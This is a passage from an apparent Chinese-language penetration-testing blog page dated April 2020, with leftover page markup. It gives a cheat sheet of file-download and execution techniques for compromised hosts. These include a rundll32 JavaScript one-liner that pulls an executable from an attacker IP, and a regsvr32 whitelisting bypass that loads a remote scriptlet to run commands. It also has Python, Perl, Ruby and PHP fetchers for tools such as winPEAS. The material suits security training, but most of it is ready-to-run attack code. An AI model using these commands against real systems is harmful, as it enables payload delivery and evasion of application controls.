+&lt;/HTML&gt;14、rundll32rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}15、regsvr32：https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/
+regsvr32 /u /s /i:http://10.10.101.222:8000/run.sct scrobj.dllrun.sct:
+&lt;?XML version=&quot;1.0&quot;?&gt; 
+&lt;scriptlet&gt; 
+&lt;registration     
+    progid=&quot;ShortJSRAT&quot;     
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;     
+    &lt;!-- Learn from Casey Smith @subTee --&gt;     
+    &lt;script language=&quot;JScript&quot;&gt;         
+        &lt;![CDATA[             
+            ps  = &quot;cmd.exe /c calc.exe&quot;;   ####命令执行          
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);         
+            ]]&gt; 
+&lt;/script&gt; 
+&lt;/registration&gt;
+&lt;/scriptlet&gt;常见编程环境下载Python1、命令行版本python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/filename&quot;);localfile=open(&apos;c:\tmp\filename&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot;2、脚本执行版本#!python
+#!/usr/bin/python
+import urllib2
+u = urllib2.urlopen(&apos;http://domain/file&apos;)
+localFile = open(&apos;local_file&apos;, &apos;w&apos;)    
+localFile.write(u.read())
+localFile.close()kali@kali:~# python test.py
+3、通过python脚本构造任意文件上传页面： https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/
+Perl1、命令行版本perl -MLWP::Simple -e &apos;getstore (&quot;http://xx.xx.xx.xx/filename&quot;,&quot;filename&quot;)&apos;2、脚本执行
+#!/usr/bin/perl
+use LWP::Simple;
+getstore(&quot;http://domain/file&quot;, &quot;file&quot;);kali@kali:~# perl test.pl
+Ruby#!ruby
+#!/usr/bin/ruby
+require &apos;net/http&apos;
+Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
+r = http.get(&quot;/file&quot;)
+open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
+file.write(r.body)
+}
+}kali@kali:~# ruby test.rb
+PHP1、命令行
+php -r &apos;$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);&apos;2、脚本执行
+&lt;?php 
+$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);
+$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);
+fwrite($f, $data[0]);
+fclose($f);?&gt;kali@kali:~# php test.php
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="Rerverse_shell&amp;Interactive_shell" alt="Rerverse_shell&amp;Interactive_shell" href="/2020/04/19/Rerverse-shell-Interactive-shell/"
                        class="post-item swiper-slide flex flex-v">
